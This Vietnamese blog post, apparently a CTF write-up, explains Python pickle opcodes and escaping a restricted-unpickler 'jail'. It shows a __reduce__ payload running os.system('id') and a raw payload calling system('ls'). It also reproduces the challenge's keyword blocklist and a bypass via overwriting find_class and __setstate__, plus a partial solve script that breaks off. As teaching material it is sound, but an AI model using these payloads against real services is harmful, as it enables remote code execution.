<p>Như ta đã biết thì để truyền các dữ liệu phức tạp như object hay array thì ta sẽ phải serialize nó sang một dạng có thể truyền tải và lưu trữ được. Nếu cảm thấy khó hiểu thì thật ra JSON cũng là một dạng của serialization, trong JS thì <code>JSON.stringify</code> là serialize và <code>JSON.parse</code> là deserialize ( quá trình ngược lại của serialize)</p>
<p>Trong python thì pickle chính là thư viện native của python phục vụ việc serialize các kiểu dữ liệu như object hay array</p>


<h3 class="relative group">Pickle structure 
    <div id="pickle-structure" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#pickle-structure" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Pickle sử dụng một Pickle Machine để serialize/deserialize data, bao gồm 3 phần là parser, stack và memo:</p>
<ul>
<li>
<p>Parser là phần sẽ xử lý các opcodes và call tới dispatcher ứng với opcode đó

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/abb60cf2-cec1-47e6-a361-1a4e44ee7e33" alt="image" />
    
  </figure>
</p>
</li>
<li>
<p>Stack thì như cái tên của nó, đóng vai trò là bộ nhớ ngắn hạn</p>
</li>
<li>
<p>Memo đóng vai trò là một bộ nhớ dài hạn hơn, được implement bằng một python dict

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c2c04ea1-d63c-4d6c-b877-a2e73e1a61e0" alt="image" />
    
  </figure>
</p>
</li>
</ul>
<p>Tại source code của <a href="https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4" target="_blank">python</a> ta có thể thấy các opcodes được khai báo ở phía trên

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/572ebb23-46cd-4744-a29f-93e0577874ba" alt="image" />
    
  </figure>
</p>
<p>Các opcodes này cho phép ta thao tác với nhiều kiểu dữ liệu khác nhau như list, tuple, dict, objects, strings, int, &hellip; thao tác với stack và memo. Ngoài ra nó còn cho phép ta import các modules, ghi thuộc tính vào các object</p>


<h3 class="relative group">What could go wrong 
    <div id="what-could-go-wrong" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#what-could-go-wrong" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Nếu bạn là một web player thì hẳn đã gặp qua pickle khi tìm hiểu insecure deserialization, nhưng liệu bạn đã hiểu về quá trình deserialization của pickle chưa? Cùng nhìn vào một ví dụ</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7b6e7019-0d3f-45cd-ae81-c4c065b0b9c0" alt="image" />
    
  </figure>
</p>
<p><code>__reduce__</code> là một magic method trong python, nó được dùng để nói cho python biết các để reconstruct object đó, cần một ví dụ khác :</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/02ce6aae-c536-45d6-8c5b-70239dcaf39a" alt="image" />
    
  </figure>
</p>
<p><code>copy</code> cũng sử dụng magic method này để biết các reconstruct lại object.</p>
<p>Quay lại vấn đề, nếu bạn thử in kết quả từ <code>pickle.dumps</code> ta sẽ có một bytestream khá khó hiểu</p>
<pre tabindex="0"><code>\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.
</code></pre><p>Ta sẽ dùng một thư viện có sẵn khác để hỗ trợ việc đọc hiểu bytestream này, đó là <code>pickletools</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">pickletools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s2">&#34;id&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">Evil</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span></code></pre></div><pre tabindex="0"><code>    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE &#39;posix&#39;
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE &#39;system&#39;
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE &#39;id&#39;
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
highest protocol among opcodes = 4
</code></pre><p>Opcode đầu tiên là <code>PROTO</code> được đánh dấu bằng ký tự <code>\x80</code>, đây là opcode dùng để khai báo version được sử dụng của pickle protocol, cao nhất là 5, version càng cao thì các opcode mà nó hỗ trợ càng nhiều. Opcode <code>MEMOIZE</code> dùng để đưa value ở top của stack vào memo (không có gì đặc biệt nên từ giờ ta sẽ bỏ qua nó), SHORT_BINUNICODE thì đơn giản là dùng để khai báo một unicode string và đưa giá trị vào stack</p>
<p><code>STACK_GLOBAL</code> là opcode đặc biệt, dùng để load một attribute bất kì từ 1 module và đưa vào top stack, với tên module cũng như tên attribute được lấy từ stack, trong trường hợp này tương đương với <code>from posix import system</code></p>
<p>Tiếp theo ta thấy nó chứa chuỗi <code>id</code> vào top stack, sau đó dùng opcode <code>TUPLE1</code> để tạo 1 tuple 1 phần tử, cuối cùng là opcode <code>REDUCE</code>, dùng để gọi một callable object (function) với arguments là tuple ở đỉnh stack, giờ thì ta biết lý do tại sao payload lại là <code>(os.system,(&quot;id&quot;,))</code> rùi, arguments của callable bắt buộc phải là 1 tuple</p>
<p>Một điều hay nữa là ta có để rút gọn payload ở trên đi rất nhiều: <code>cos\nsystem\nS'ls'\n\x85R.</code>

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/76024c6c-0740-4767-b9ac-ed2656a4cabb" alt="image" />
    
  </figure>
</p>
<p>Thay vì dùng <code>STACK_GLOBAL</code> thì ta có thể dùng opcode GLOBAL để load trực tiếp attribute mà không cần thông qua stack, sau đó push <code>id</code> vào stack bằng opcode <code>STRING</code> (khai báo 1 string) rồi dùng REDUCE để gọi <code>posix.system('id')</code>, opcode <code>.</code> (<code>STOP</code>) luôn nằm ở cuối để kết thúc quá trình deserialization</p>
<p>Cách mà mình tìm hiểu pickle là bằng việc đọc source code của nó, source code khá dễ đọc nên bạn có thể truy cập vào link source mình để khi nãy và tìm hiểu thêm về nó nhé</p>


<h2 class="relative group">The challenge 
    <div id="the-challenge" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#the-challenge" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">__main__</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Security measure -- forbid calls</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;reduce&#39;</span><span class="p">,</span> <span class="s1">&#39;inst&#39;</span><span class="p">,</span> <span class="s1">&#39;obj&#39;</span><span class="p">,</span> <span class="s1">&#39;newobj&#39;</span><span class="p">,</span> <span class="s1">&#39;newobj_ex&#39;</span><span class="p">]:</span> <span class="c1">#pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">pickle</span><span class="p">,</span> <span class="n">op</span><span class="o">.</span><span class="n">upper</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">delattr</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Stop right there, you heineous criminal!&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Security measure -- remove dangerous class and method</span>
</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span>
</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">find_class</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Security measure -- overload unpickler with an actually secure class</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SecureUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">object</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Security measure -- prevent access to dangerous elements</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;exe&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;break&#39;</span><span class="p">,</span> <span class="s1">&#39;set&#39;</span><span class="p">,</span> <span class="s1">&#39;eva&#39;</span><span class="p">,</span> <span class="s1">&#39;help&#39;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;dis&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Smuggling contraband in broad daylight?! Guards!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Security measure -- only the main module is a valid lookup target</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">__main__</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Security measure -- remove dangerous magic</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">globals</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">k</span> <span class="ow">and</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">del</span> <span class="nb">globals</span><span class="p">()[</span><span class="n">k</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Security measure -- remove dangerous magic</span>
</span></span><span class="line"><span class="cl"><span class="n">__builtins__</span> <span class="o">=</span> <span class="p">{</span> <span class="n">k</span><span class="p">:</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">)</span> <span class="k">if</span> <span class="s1">&#39;_&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">k</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># My jail is very secure!</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">SecureUnpickler</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</span></span></code></pre></div><p>Yêu cầu đơn giản là đọc file flag ở trên server</p>


<h3 class="relative group">Analyzing 
    <div id="analyzing" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#analyzing" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Đầu tiên ta thấy một số opcodes bị ghi đè</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;reduce&#39;</span><span class="p">,</span> <span class="s1">&#39;inst&#39;</span><span class="p">,</span> <span class="s1">&#39;obj&#39;</span><span class="p">,</span> <span class="s1">&#39;newobj&#39;</span><span class="p">,</span> <span class="s1">&#39;newobj_ex&#39;</span><span class="p">]:</span> <span class="c1">#pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">pickle</span><span class="p">,</span> <span class="n">op</span><span class="o">.</span><span class="n">upper</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">delattr</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Stop right there, you heineous criminal!&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></div><p>Ta sẽ không thể gọi các opcodes này nữa, các opcodes này đều là các opcodes quan trọng trong việc call function, như ở description ta cũng có thể thấy, các function calling opcodes sẽ bị chặn</p>
<p>tiếp theo là xóa class <code>Unpickler</code> và method <code>_Unpickler.find_class</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">del</span> <span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span>
</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">pickle</span><span class="o">.</span><span class="n">_Unpickler</span><span class="o">.</span><span class="n">find_class</span>
</span></span></code></pre></div><p>Tạo class <code>SecureUnpickler</code> kế thừa <code>pickle._Unpickler</code> và ghi đè method <code>find_class</code> nhằm chặn việc load một số attribute bằng opcode <code>GLOBAL</code>, <code>find_class</code> là method được gọi để tìm attribute trong modules mà <code>GLOBAL</code> và <code>STACK_GLOBAL</code> gọi, nghĩa là mỗi khi muốn load một attribute nào đó (như <code>os.system</code>) thì đều phải đi qua filter này</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;exe&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;break&#39;</span><span class="p">,</span> <span class="s1">&#39;set&#39;</span><span class="p">,</span> <span class="s1">&#39;eva&#39;</span><span class="p">,</span> <span class="s1">&#39;help&#39;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;dis&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Smuggling contraband in broad daylight?! Guards!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span></code></pre></div><p>Tiếp theo là xóa các attribute có <code>_</code> trong tên ngoại trừ <code>__main__</code> và <code>__builtins__</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">globals</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">k</span> <span class="ow">and</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">del</span> <span class="nb">globals</span><span class="p">()[</span><span class="n">k</span><span class="p">]</span>
</span></span></code></pre></div><p>module <code>__builtins__</code> chứa các builtin function cũng bị ghi đè và chỉ chừa lại các attribute không có <code>_</code> trong tên</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">__builtins__</span> <span class="o">=</span> <span class="p">{</span> <span class="n">k</span><span class="p">:</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">)</span> <span class="k">if</span> <span class="s1">&#39;_&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">k</span> <span class="p">}</span>
</span></span></code></pre></div><p>Data nhận vào ở dạng hex và được unpickle (deserialize)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">SecureUnpickler</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</span></span></code></pre></div>

<h3 class="relative group">Let&rsquo;s the game begin 
    <div id="lets-the-game-begin" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#lets-the-game-begin" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Vấn đề đầu tiên ta gặp phải là việc có 5 opcode quan trọng bị xóa, dẫn đến việc ta không thể call function được. Vào <a href="https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4" target="_blank">source code</a> tìm đến class <code>_Unpickler</code> để tìm opcode thay thế</p>
<p>Sau một hồi đọc có thể thầy là không còn opcode nào khác có thể call được function, tuy nhiên tại dispatcher của opcode <code>BUILD</code> ta thấy một dòng đoạn code khá thú vị</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8b792d40-e59b-4f86-8879-6d8d0174e6ce" alt="image" />
    
  </figure>
</p>
<p>Tại đây sẽ check xem nếu object có method <code>__setstate__</code> thì sẽ call đến method này với tham số là state, điều quan trọng là ta đều có thể kiểm soát được cả 2 data này, nhưng state thì dễ hiểu nhưng làm sao để kiểm soát<code>__setstate__</code>?</p>
<p>Nếu nhìn xuống phần code bên dưới nữa ta sẽ thấy opcode này có thể được dùng để gán các thuộc tính tùy ý cho object</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ed4c9e89-53bf-40ac-821c-646e1300880f" alt="image" />
    
  </figure>
</p>
<p>Vậy ý tưởng là tìm cách ghi <code>__setstate__</code> thành một method bất kì muốn gọi tới (tất nhiên là method đó chỉ có thể có 1 arg). Giờ thì ta cần tìm một method, nếu để ý kỹ thì hàm <code>find_class</code> của challenge chỉ có phép ta lấy attribute từ <code>__main__</code>, mà các hàm builtins thì nằm trong <code>__builtins__</code>, vậy làm sao để lấy được các attribute này đây?</p>
<p>Sau vài lần thử mình phát hiện ra <code>__main__</code> có 1 attribute khác là <code>__main__</code> trỏ đến chính nó, vậy sẽ ra sao nếu ta thử dùng dùng <code>GLOBAL</code> để lấy <code>__main__</code> và <code>__builtins__</code>, sau đó dùng opcode <code>BUILD</code> để ghi đè <code>__main__</code> thành chính <code>__builtins__</code>? Cùng thử nhé, thay vì craft payload bằng tay (như trước nay mình vẫn làm @@) thì nay mình biết được pwntools có hỗ trợ gen opcodes cho pickle</p>
<p>Đầu tiên là load <code>__builtins__</code> rồi lưu vào memo, sau đó load <code>__main__</code> rồi tạo một tuple 2 phần tử (mục đích là để <code>__builtins__ </code> được set thông qua <code>setattr</code>, nó sẽ an toàn hơn là set trực tiếp, các bạn đọc source code dispatcher của BUILD nha)</p>
<p>Đưa payload cho server và print <code>__main__</code>ra để debug, thử <code>print(__main__.items())</code> ta sẽ thấy các builtin functions</p>
<p><strong>fact nhỏ</strong>:</p>
<blockquote>
<p>Khi bạn dùng <code>dir(__builtins__)</code> và <code>__builtins__.__dir__()</code> thì kết quả sẽ khác nhau, vì nếu <code>__builtins__</code> là list thì <code>dir()</code> sẽ trả về các <strong>phần tử của list</strong> đó, còn khi gọi <code>__builtins__.__dir__()</code> thì là đang gọi đến chính method <code>__dir__</code> của class List (<code>__builtins__</code> là list chứa các builtin methods) nên nó sẽ trả về các thuộc tính/methods của object List</p>
</blockquote>
<p>Bây giờ ta đã ghi đè <code>__main__</code> và mang các builtin methods ra nơi có thể &ldquo;với&rdquo; tới, tiếp theo ta sẽ thử ghi đè hàm <code>print</code> vào <code>__setstate__</code>. Lưu ý là vì ban đầu lúc push <code>__main__</code> thì ta chưa pop ra nên tại dòng số 26 khi build thì object được dùng sẽ là chính <code>__main__</code>, opcode <code>BUILD</code> ở dòng 26 là để trigger payload sau khi đã ghi đè <code>__setstate__</code>, <code>called</code> chính là <code>state</code>. Lúc này ta đã gọi được <code>print(&quot;called&quot;)</code>, nhưng ta không thể gọi <code>eval</code> hay <code>exec</code> gì được vì đã filter tại <code>find_class</code></p>


<h3 class="relative group">Overwrite the world 
    <div id="overwrite-the-world" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overwrite-the-world" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Nếu ta có thể overwrite được <code>__setstate__</code>, vậy liệu ta có thể overwrite được <code>find_class</code> của <code>SecureUnpickler</code> không? Nếu vậy ta sẽ overwrite nó bằng cái gì? Đó chính là method <code>get</code> của <code>__builtins__</code>. Method này sẽ cho phép ta lấy attribute từ 1 dict, mỗi khi <code>GLOBAL</code> dispatcher trong <code>_Unpickler</code> được gọi thì nó sẽ dùng method này để tìm đến <code>attribute</code> trong modules tương ứng và đưa vào stack</p>
<p>Oke vậy tất cả mảnh ghép đã có đủ, flow cuối cùng sẽ như sau:</p>
<ul>
<li>Lấy method <code>get</code> của <code>__builtins__</code> để ghi đè <code>find_class</code> của <code>SecureUnpickler</code></li>
<li>Ghi đè <code>__setattr__</code> của <code>__main__</code> thành <code>eval</code></li>
<li>Trigger <code>__setstate__</code> với <code>state</code> là code python để chạy eval</li>
</ul>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/faf14e7b-92dd-4b89-bb64-ef64c9d8d514" alt="image" />
    
  </figure>
</p>
<p>Phần này mình không giải thích kỹ để các bạn có thể tự giải và hiểu hơn về pickle</p>
<p>Đây là script giải để các bạn tham khảo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickletools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">PROTO</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">5</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;__main__</span><span class="se">\n</span><span class="s2">__main__</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINPUT</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># save __main__ to memo[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;__main__</span><span class="se">\n</span><span class="s2">SecureUnpickler</span><span class="se">\n</span><span class="s2">&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINPUT</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># save SecureUnpickler to memo[2]</span>
